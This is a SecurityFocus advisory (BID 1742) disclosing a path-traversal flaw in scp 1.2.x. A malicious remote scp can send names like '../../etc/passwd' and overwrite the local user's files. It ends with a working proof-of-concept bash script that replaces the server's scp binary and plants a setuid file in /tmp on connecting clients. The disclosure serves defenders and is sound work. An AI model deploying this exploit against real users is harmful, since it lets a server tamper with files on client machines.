source: http://www.securityfocus.com/bid/1742/info

A vulnerability exists in the 1.2.x releases of scp which, if properly exploited using a modified scp binary on the server end, can permit the remote server to spoof local pathnames and overwrite files belonging to the local user.

For example, following the command

scp user@remotehost:/somefile /home/user/newfile

the modified server on the remote machine maliciously sends the filename as ../../etc/passwd

the local user's scp program will then write the data to

/home/user/../../etc/passwd

(which is the same as /etc/passwd)

Note that the target file can only be overwritten if the local user has write access to it. As a result, it remains inadvisable to run scp as root.

This vulnerability applies to 1.2.x versions of ssh on the remote machine, irrespective of the version running as the client.

ssh-2.x on the remote employs a different protocol and as a result is reportedly not vulnerable to this bug.

As a proof of concept, I created trivial scp replacement (put it on remote machine in the place of original scp binary - usually in /usr/local/bin).

It will try to exploit any file transfer, creating setuid /tmp/ScpIsBuggy file on client system:

#!/bin/bash

echo "D0755 0 ../../../../../../tmp/nope"
echo "D0755 0 ../../../../../../tmp"
echo "C4755 200 ScpIsBuggy"
dd if=/dev/urandom of=/dev/stdout bs=200 count=1 2>/dev/null
dd if=/dev/zero of=/dev/stdout bs=1 count=2 2>/dev/null